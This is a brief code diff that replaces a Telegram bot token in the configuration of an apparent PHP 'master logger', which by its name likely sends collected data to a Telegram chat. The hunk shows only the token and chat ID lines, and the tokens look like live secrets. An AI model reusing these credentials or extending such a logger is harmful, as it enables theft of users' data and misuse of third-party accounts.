@@ -2,7 +2,7 @@
 // ===================================================
 // ALZZc-777 MASTER LOGGER VERCEL EDITION
 // ===================================================
-$token  = "8769510332:AAHj32YP3UmoJT_faMLnsbAa4Gd0OPMMzuU";
+$token  = "8919205558:AAFp9N50UVrIFxozxXVhi0BjMcXV8NHwjeI";
 $chatid = "6891987044";
 // ===================================================
 
